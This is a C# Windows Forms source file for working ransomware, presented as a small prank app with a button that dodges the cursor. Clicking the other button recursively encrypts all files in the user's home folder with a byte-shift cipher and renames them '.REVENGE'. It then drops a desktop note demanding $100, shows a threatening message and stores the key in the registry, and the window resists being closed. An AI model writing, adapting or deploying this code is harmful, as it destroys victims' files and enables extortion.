using Microsoft.Win32;
using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace BuscarElAmor {
    public partial class Form1 : Form {

        bool clicked = false;
        string password = GeneratePassword(16);

        public Form1() {
            InitializeComponent();
        }

        public void ejemplo() {
            var file = Directory.GetFiles(@"C:\Users\" + Environment.UserName)[0];
            if (file.EndsWith(".REVENGE")) {
                try {
                    string filename = file.Split(new[] { ".REVENGE" }, StringSplitOptions.None)[0];
                    File.WriteAllBytes(file, decryptByteVigenere(File.ReadAllBytes(file), password));
                    File.Move(file, filename);
                } catch (Exception) {
                    MessageBox.Show("Error, are you sure this password is correct ?");
                    return;
                }
            }
        }

        public static byte[] decryptByteVigenere(byte[] ciphertext, string key) {
            byte[] result = new Byte[ciphertext.Length];
            key = key.Trim().ToUpper();
            int keyIndex = 0;
            int keylength = key.Length;
            for (int i = 0; i < ciphertext.Length; i++) {
                keyIndex = keyIndex % keylength;
                int shift = (int)key[keyIndex] - 65;
                result[i] = (byte)(((int)ciphertext[i] + 256 - shift) % 256);
                keyIndex++;
            }
            return result;
        }

        void encryptDirectory(string location) {
            try {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++) {
                    string extension = Path.GetExtension(files[i]);
                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(files[i]), password);
                    File.WriteAllBytes(files[i], bytesEncrypted);
                    File.Move(files[i], files[i] + ".REVENGE");
                }
                for (int i = 0; i < childDirectories.Length; i++) {
                    encryptDirectory(childDirectories[i]);
                }
            } catch { }
        }

        private static Random random = new Random();
        public static string GeneratePassword(int length) {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static byte[] Encrypt(byte[] plaintext, string key) {
            byte[] result = new Byte[plaintext.Length];
            key = key.Trim().ToUpper();
            int keyIndex = 0;
            int keylength = key.Length;
            for (int i = 0; i < plaintext.Length; i++) {
                keyIndex = keyIndex % keylength;
                int shift = (int)key[keyIndex] - 65;
                result[i] = (byte)(((int)plaintext[i] + shift) % 256);
                keyIndex++;
            }
            return result;
        }

        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e) {
            if(!clicked) {
                string message = "No puede cerrar esta ventana antes de haber tomado una decisión.";
                string title = "Tips";
                MessageBoxButtons buttons = MessageBoxButtons.OKCancel;
                DialogResult result = MessageBox.Show(message, title, buttons, MessageBoxIcon.Information);
                if (result == DialogResult.OK) {
                    this.Close();
                }
                e.Cancel = true;
            }
        }

        private void button2_Click(object sender, EventArgs e) {
            int x = this.ClientSize.Width - button2.Width;
            int y = this.ClientSize.Height - button2.Height;
            Random r = new Random();
            button2.Location = new Point(r.Next(0, x + 1), r.Next(0, y + 1));
        }

        private void button1_Click(object sender, EventArgs e) {
            var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
            var folders = Directory.GetDirectories(@"C:\Users\" + Environment.UserName);
            foreach (var folder in folders) {
                try {
                    encryptDirectory(folder);
                } catch {
                    continue;
                }
            }
            //encrypting all files in the victim user directory .
            foreach (var file in directory) {
                try {
                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
                    File.WriteAllBytes(file, bytesEncrypted);
                    File.Move(file, file + ".REVENGE");
                } catch {
                    continue;
                }
            }
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
            MessageBox.Show("All your files gone, send me 100$ to restore your files or die", "GG", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            ////////////////////
            try {
                RegistryKey rsg = null;
                if (Registry.LocalMachine.OpenSubKey("SOFTWARE\\GeneratedPass").SubKeyCount <= 0) {
                    Registry.LocalMachine.DeleteSubKey("SOFTWARE\\GeneratedPass");
                    Registry.LocalMachine.CreateSubKey("SOFTWARE\\GeneratedPass");
                }
                rsg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\GeneratedPass", true);//true??????
                rsg.SetValue("NuestraClave", password);
                rsg.Close();
            } catch (Exception ex) {
            }
            clicked = true;
        }

    }
}
